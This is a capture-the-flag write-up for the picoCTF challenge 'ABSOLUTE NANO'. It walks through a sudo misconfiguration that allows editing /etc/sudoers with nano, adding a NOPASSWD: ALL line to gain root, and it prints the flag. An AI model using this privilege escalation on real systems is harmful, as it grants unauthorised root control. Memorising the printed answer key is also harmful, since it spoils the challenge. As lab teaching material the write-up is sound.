# picoCTF Write-up: ABSOLUTE NANO

## General Information

-   Challenge: ABSOLUTE NANO
-   Platform: picoCTF
-   Category: General Skills
-   Author: DARKRAICG492
-   Difficulty: Easy

------------------------------------------------------------------------

## Description

You have complete power with nano. Think you can get the flag?

Additional details will be available after launching your challenge
instance.

Hint: What can you do with nano?

------------------------------------------------------------------------

## Analysis

After launching the instance and connecting to the server via SSH using
the `ctf-player` account, the first step is to list the files in the
current directory:

``` bash
ctf-player@challenge:~$ ls -la
...
-r--r----- 1 root root 35 Feb 4 22:26 flag.txt
```

The file `flag.txt` exists in the home directory but is owned by `root`
and belongs to the `root` group. The read permission is only granted to
the owner and the group.

Therefore, the `ctf-player` user cannot directly read the file using:

``` bash
cat flag.txt
```

This results in a **Permission denied** error.

Next, check the available `sudo` permissions:

``` bash
sudo -l
```

The output reveals:

``` bash
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

This means the user `ctf-player` can execute:

    /bin/nano /etc/sudoers

as **root**, without requiring a password.

The `/etc/sudoers` file controls **sudo privileges** on a Linux system.

------------------------------------------------------------------------

## Exploitation

The vulnerability is that the system allows editing the `sudoers` file
using `nano` with root privileges. This allows us to grant ourselves
full sudo access.

### Step 1: Open sudoers

Run the exact command allowed:

``` bash
sudo /bin/nano /etc/sudoers
```

Note: The absolute path `/bin/nano` must be used.

### Step 2: Grant Root Privileges

Inside the nano editor, add the following line at the bottom of the
file:

    ctf-player ALL=(ALL) NOPASSWD: ALL

This grants the user `ctf-player` permission to run any command as any
user without a password.

### Step 3: Save and Exit

-   Press `Ctrl + O` to write the file
-   Press `Enter` to confirm
-   Press `Ctrl + X` to exit nano

### Step 4: Read the Flag

Now `ctf-player` effectively has root privileges.

``` bash
sudo cat $HOME/flag.txt
```

------------------------------------------------------------------------

## Flag

    picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}

------------------------------------------------------------------------

## Key Takeaway

A misconfigured sudo rule allowing a user to edit `/etc/sudoers` with
elevated privileges results in a **privilege escalation vulnerability**.
The user can grant themselves unrestricted sudo access and gain
root-level control of the system.
